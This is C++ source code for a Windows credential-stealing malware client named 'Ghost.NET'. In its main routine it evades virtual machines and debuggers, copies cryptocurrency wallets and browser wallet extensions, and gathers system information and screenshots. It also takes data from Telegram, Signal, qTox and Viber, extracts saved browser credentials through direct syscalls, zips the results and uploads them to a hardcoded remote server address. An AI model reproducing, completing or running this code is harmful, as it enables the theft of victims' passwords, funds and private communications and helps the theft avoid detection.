#include <iostream>
#include <filesystem>
#include <string>
#include <system_error>
#include <vector>
#include <map>
#define NOMINMAX  // Prevent Windows min/max macros
#include "core.h"
#include <algorithm>
#include <fstream>
#include <sstream>
#include <ctime>
#include <iomanip>
#include <winver.h>
#include <intrin.h>
#include <iphlpapi.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <winreg.h>
#include <cstdlib>
#include <comdef.h>
#include <Wbemidl.h>

#include <memory>
#include <gdiplus.h>
#include <shlobj.h>
#include <thread>
#include <chrono>
#include <mutex>
#include "json/json.h"

#include "chrome_inject.h"
#include <sodium.h>
#include <zip.h>

#include <curl/curl.h>
#include "ResourceConfig.h"
#include "vmaware.hpp"


size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* response) {
    size_t totalSize = size * nmemb;
    response->append((char*)contents, totalSize);
    return totalSize;
}

// Function to read string from executable resources
std::string ReadResourceString(int resourceId, const std::string& defaultValue) {
    try {
        HMODULE hModule = GetModuleHandle(NULL);
        if (!hModule) {
            return defaultValue;
        }

        HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(resourceId), RT_RCDATA);
        if (!hResource) {
            return defaultValue;
        }

        HGLOBAL hLoadedResource = LoadResource(hModule, hResource);
        if (!hLoadedResource) {
            return defaultValue;
        }

        LPVOID pLockedResource = LockResource(hLoadedResource);
        if (!pLockedResource) {
            return defaultValue;
        }

        DWORD resourceSize = SizeofResource(hModule, hResource);
        if (resourceSize == 0) {
            return defaultValue;
        }

        // Convert to string and remove null terminator if present
        std::string result(static_cast<const char*>(pLockedResource), resourceSize);
        
        // Remove null terminators
        size_t nullPos = result.find('\0');
        if (nullPos != std::string::npos) {
            result = result.substr(0, nullPos);
        }

        return result.empty() ? defaultValue : result;
    }
    catch (...) {
        return defaultValue;
    }
}

// Function to build server URL from resources
std::string BuildServerUrl() {
    std::string serverIp = ReadResourceString(RESOURCE_SERVER_IP, "51.38.196.76");
    std::string serverPort = ReadResourceString(RESOURCE_SERVER_PORT, "3000");
    std::string apiPath = ReadResourceString(RESOURCE_API_PATH, "/api/upload");
    
    return "http://" + serverIp + ":" + serverPort + apiPath;
}




class ZipUploader {
private:
    std::string serverUrl;
    CURL* curl;

public:
    ZipUploader(const std::string& url) : serverUrl(url) {
        curl_global_init(CURL_GLOBAL_ALL);
        curl = curl_easy_init();
    }

    ~ZipUploader() {
        if (curl) {
            curl_easy_cleanup(curl);
        }
        curl_global_cleanup();
    }

    bool uploadZipFile(const std::string& zipFilePath) {
        if (!curl) {
            std::cerr << "Failed to initialize CURL" << std::endl;
            return false;
        }

        // Check if file exists
        std::ifstream file(zipFilePath, std::ios::binary);
        if (!file.is_open()) {
            std::cerr << "Cannot open file: " << zipFilePath << std::endl;
            return false;
        }
        file.close();

        // Set up the form
        curl_mime* form = curl_mime_init(curl);
        curl_mimepart* field = curl_mime_addpart(form);

        // Add the file field
        curl_mime_name(field, "zipfile");
        curl_mime_filedata(field, zipFilePath.c_str());

        // Set up the request
        curl_easy_setopt(curl, CURLOPT_URL, serverUrl.c_str());
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);

        // Set up response handling
        std::string response;
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        // Perform the request
        CURLcode res = curl_easy_perform(curl);

        // Clean up
        curl_mime_free(form);

        if (res != CURLE_OK) {
            std::cerr << "Upload failed: " << curl_easy_strerror(res) << std::endl;
            return false;
        }

        std::cout << "Server response: " << response << std::endl;
        return true;
    }
};



// Logging functionality
class Logger {
private:
    std::ofstream logFile;
    std::mutex logMutex;
    
public:
    Logger() {
        logFile.open("client_logs.txt", std::ios::app);
        if (logFile.is_open()) {
            logFile << "\n=== Ghost.NET Client Session Started: " << GetCurrentTimeString() << " ===\n";
            logFile.flush();
        }
    }
    
    ~Logger() {
        if (logFile.is_open()) {
            logFile << "=== Ghost.NET Client Session Ended: " << GetCurrentTimeString() << " ===\n\n";
            logFile.close();
        }
    }
    
    void Log(const std::string& message) {
        std::lock_guard<std::mutex> lock(logMutex);
        std::string timestamp = GetCurrentTimeString();
        std::string logMessage = "[" + timestamp + "] " + message;
        
        // Output to console
        std::cout << logMessage << std::endl;
        
        // Output to file
        if (logFile.is_open()) {
            logFile << logMessage << std::endl;
            logFile.flush();
        }
    }
    
private:
    std::string GetCurrentTimeString() {
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(
            now.time_since_epoch()) % 1000;
        
        std::stringstream ss;
        ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
        ss << '.' << std::setfill('0') << std::setw(3) << ms.count();
        return ss.str();
    }
};

// Global logger instance
Logger g_logger;
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "shell32.lib")

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "version.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "advapi32.lib")


namespace fs = std::filesystem;


using namespace Gdiplus;

#include "FileUtils.h"
#include "AdvancedFileCopier.h"
#include "PCInfoGatherer.h"
#include "WalletData.h"
#include "MonitorCapture.h"
#include "telegram.h"
#include "qtox.h"
#include "viber.h"
#include "signal.h"
#include "anti-vm.h"
#include "BeingDebugged.h"
#include "EntryPoint_AntiDebug.h"
#include "Vectored_Exception_Handling.h"
#include "Segment_Encryption.h"
#include "Passwords.h"
using namespace ghostnet;
namespace fs = std::filesystem;
using namespace Gdiplus;

static inline bool copyDirectoryRecursive(const std::string& source, const std::string& destination) {
    try {
        if (!fs::exists(source)) {
            return false;
        }
        fs::create_directories(destination);
        try {
            fs::copy(source, destination, fs::copy_options::recursive | fs::copy_options::overwrite_existing);
            return true;
        } catch (...) {
            return AdvancedFileCopier::copyDirectoryAdvanced(source, destination);
        }
    } catch (...) {
        return false;
    }
}



void EnsureDirectoryExists(const std::string& dirPath) {
    CreateDirectoryA(dirPath.c_str(), NULL);
}

// Simple zip compression using Windows API
bool CreateZipNoPassword(const std::string& sourceDir, const std::string& zipPath) {
    int err = 0;
    zip_t* za = zip_open(zipPath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, &err);
    if (!za) return false;

    bool ok = true;

    for (const auto& entry : fs::recursive_directory_iterator(sourceDir)) {
        if (!entry.is_regular_file()) continue;

        // Make forward-slash paths for ZIP entries
        std::string rel = fs::relative(entry.path(), sourceDir).string();
        std::replace(rel.begin(), rel.end(), '\\', '/');

        zip_source_t* src = zip_source_file(za, entry.path().string().c_str(), 0, 0);
        if (!src) { ok = false; break; }

        // Add file to archive (overwrite if exists). Mark name as UTF-8 just in case.
        zip_int64_t idx = zip_file_add(za, rel.c_str(), src, ZIP_FL_OVERWRITE | ZIP_FL_ENC_UTF_8);
        if (idx < 0) {
            // Important: free the source if add failed
            zip_source_free(src);
            ok = false;
            break;
        }

        // Optional: control compression (requires zlib)
        // zip_set_file_compression(za, idx, ZIP_CM_DEFLATE, 9); // max compression
    }

    if (!ok) {
        zip_discard(za);   // abort and free
        return false;
    }

    // Write and close. On failure, libzip has already cleaned up internal state.
    if (zip_close(za) < 0) return false;

    return true;
}







int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    if (VM::detect()) {
 
        exit(1);
    }
    else {
    
    }


  
    AddVectoredExceptionHandler(1, VectExceptionHandler);
    RunAllAntiVM();
    RunAllAntiDebug();

    std::string appData = getAppDataPath();
    std::string localAppData = getLocalAppDataPath();
    std::string userProfile = getUserProfilePath();

    if (appData.empty() || localAppData.empty() || userProfile.empty()) {
        return 1;
    }

    std::string ghostNetPath = appData + "\\GhostNet";
    if (!createDirectoryIfNotExists(ghostNetPath)) {
        return 1;
    }

    std::string walletsPath = ghostNetPath + "\\Wallets";
    std::string extensionsPath = ghostNetPath + "\\Extensions";
    createDirectoryIfNotExists(walletsPath);
    createDirectoryIfNotExists(extensionsPath);

    const std::map<std::string, std::string> walletPaths = buildWalletPaths(appData, localAppData);
    std::string chromePath = localAppData + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\";
    const std::map<std::string, std::string> extensionIds = buildExtensionIds();

    int foundWallets = 0;
    int foundExtensions = 0;

    PCInfoGatherer gatherer;
    if (!gatherer.gatherInformation(ghostNetPath + "\\information.txt")) {
        return 1;
    }

    for (const auto& kv : walletPaths) {
        const std::string& walletName = kv.first;
        const std::string& walletPath = kv.second;
        if (fs::exists(walletPath)) {
            std::string destPath = walletsPath + "\\" + walletName;
            if (copyDirectoryRecursive(walletPath, destPath)) {
                foundWallets++;
            }
        }
    }

    for (const auto& kv : extensionIds) {
        const std::string& extensionId = kv.first;
        const std::string& extensionName = kv.second;
        std::string extensionPath = chromePath + extensionId;
        if (fs::exists(extensionPath)) {
            std::string destPath = extensionsPath + "\\" + extensionName;
            if (copyDirectoryRecursive(extensionPath, destPath)) {
                foundExtensions++;
            }
        }
    }

    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    bool screenshotsOk = CaptureAllScreens(ghostNetPath);
    GdiplusShutdown(gdiplusToken);
    if (!screenshotsOk) {
        return 1;
    }

    Telegram::ExtractTelegramData(ghostNetPath);
    Signal::ExtractSignalData(ghostNetPath);
    QTox::ExtractQToxData(ghostNetPath);
    Viber::ExtractViberData(ghostNetPath);



    bool isVerbose = false;
    std::filesystem::path browserOutputPath = ghostNetPath + "\\Browsers";


    Console console(isVerbose);
    console.displayBanner();

   
    if (!InitializeSyscalls(isVerbose)) {
        console.Error("Failed to initialize direct syscalls. Critical NTDLL functions might be hooked or gadgets not found.");
        g_logger.Log("ERROR: Failed to initialize syscalls for browser extraction");
    }
    else {
        g_logger.Log("SUCCESS: Syscalls initialized for browser extraction");

   
        std::error_code ec;
        std::filesystem::create_directories(browserOutputPath, ec);
        if (ec) {
            console.Error("Failed to create browser output directory: " + browserOutputPath.u8string());
            g_logger.Log("ERROR: Failed to create browser output directory");
        }
        else {
            g_logger.Log("SUCCESS: Browser output directory created at " + browserOutputPath.string());

           
            try {
                console.Info("Starting browser credential extraction...");
                g_logger.Log("INFO: Starting browser credential extraction");
                
                ProcessAllBrowsers(console, isVerbose, browserOutputPath);
                
                console.Success("Browser extraction process completed!");
                g_logger.Log("SUCCESS: Browser credential extraction process finished");
                
             
            }
            catch (const std::exception& e) {
                console.Warn("Browser extraction encountered issues: " + std::string(e.what()));
                console.Info("Continuing with other data collection...");
                g_logger.Log("WARNING: Browser extraction had issues but continuing - " + std::string(e.what()));
                
                
            }
            catch (...) {
                console.Warn("Browser extraction encountered unknown error");
                console.Info("Continuing with other data collection...");
                g_logger.Log("WARNING: Browser extraction had unknown error but continuing");
            }
        }
    }





  
    std::string zipPath = ghostNetPath + "\\ghostnet.zip";
    g_logger.Log("Creating zip file: " + zipPath);
    if (CreateZipNoPassword(ghostNetPath, zipPath)) {
        g_logger.Log("Zip file created successfully: " + zipPath);
    } else {
        g_logger.Log("ERROR: Failed to create zip file");
    }






   
    std::string serverUrl = BuildServerUrl();
    g_logger.Log("Server URL loaded from resources: " + serverUrl);


    ZipUploader uploader(serverUrl);


    if (uploader.uploadZipFile(zipPath)) {
        std::cout << "File uploaded successfully!" << std::endl;
    }
    else {
        std::cout << "Upload failed!" << std::endl;
    }

    return 0;
}
